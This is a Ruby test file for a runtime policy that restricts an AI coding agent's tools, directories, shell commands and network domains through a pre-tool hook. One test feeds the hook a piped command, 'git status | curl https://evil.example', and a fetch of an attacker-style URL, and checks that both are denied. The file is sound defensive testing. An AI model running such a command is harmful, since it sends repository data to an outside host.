require "test_helper"
require "json"
require "open3"
require "hive/agent_profiles"
require "hive/workflow_package/runtime_policy"

class WorkflowPackageRuntimePolicyTest < Minitest::Test
  include HiveTestHelper

  def test_compiles_restrictive_claude_policy_and_materializes_hive_owned_settings
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      policy_dir = File.join(dir, "policy")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: policy_dir
      )

      assert_equal "dontAsk", policy.permission_mode
      assert_equal %w[Bash Grep Read WebFetch], policy.allowed_tools
      assert_includes policy.disallowed_tools, "WebSearch"
      assert_equal [ File.realpath(task), File.join(File.realpath(task), "reports") ], policy.directories
      assert_equal [ "git diff *", "git status" ], policy.commands
      assert_equal [ "api.example.com" ], policy.domains
      assert_equal policy_dir, File.dirname(policy.settings_path)
      assert_equal({}, JSON.parse(File.read(policy.mcp_config_path)))
      settings = JSON.parse(File.read(policy.settings_path))
      assert_equal policy.directories.drop(1), settings.fetch("permissions").fetch("additionalDirectories")
      assert settings.fetch("hooks").key?("PreToolUse")
      assert_equal [ "--settings", policy.settings_path, "--setting-sources", "",
                     "--mcp-config", policy.mcp_config_path, "--strict-mcp-config" ], policy.cli_flags
      refute_includes policy.environment.fetch("PATH"), task
    end
  end

  def test_rejects_unsupported_runner_yolo_overlap_and_unrestricted_bash
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      codex = Hive::AgentProfiles.lookup(:codex)
      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions, task_folder: task, profile: codex, policy_dir: File.join(dir, "codex")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("deny" => [ "Read" ]),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "overlap")
        )
      end

      assert_raises(Hive::ConfigError) do
        Hive::WorkflowPackage::RuntimePolicy.compile(
          permissions.merge("commands" => []),
          task_folder: task, profile: Hive::AgentProfiles.lookup(:claude), policy_dir: File.join(dir, "bash")
        )
      end
    end
  end

  def test_pre_tool_hook_denies_undeclared_compound_command_and_network_domain
    with_tmp_dir do |dir|
      task = File.join(dir, "task")
      FileUtils.mkdir_p(task)
      policy = Hive::WorkflowPackage::RuntimePolicy.compile(
        permissions,
        task_folder: task,
        profile: Hive::AgentProfiles.lookup(:claude),
        policy_dir: File.join(dir, "policy")
      )

      allowed = run_hook(policy, "Bash", { "command" => "git status && git diff --stat" })
      assert_equal "allow", allowed.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "Bash", { "command" => "git status | curl https://evil.example" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")

      denied = run_hook(policy, "WebFetch", { "url" => "https://evil.example/data" })
      assert_equal "deny", denied.dig("hookSpecificOutput", "permissionDecision")
    end
  end

  private

  def permissions
    {
      "tools" => %w[Read Grep Bash WebFetch],
      "deny" => %w[Write Edit WebSearch],
      "directories" => [ "reports" ],
      "commands" => [ "git status", "git diff *" ],
      "domains" => [ "api.example.com" ],
      "credentials" => [],
      "shell_justification" => "inspect repository state",
      "network_justification" => "fetch the declared API"
    }
  end

  def run_hook(policy, tool_name, tool_input)
    input = JSON.generate("tool_name" => tool_name, "tool_input" => tool_input)
    out, err, status = Open3.capture3(
      RbConfig.ruby,
      File.expand_path("../../../lib/hive/scripts/workflow_policy_hook.rb", __dir__),
      policy.policy_path,
      stdin_data: input
    )
    assert status.success?, err
    JSON.parse(out)
  end
end
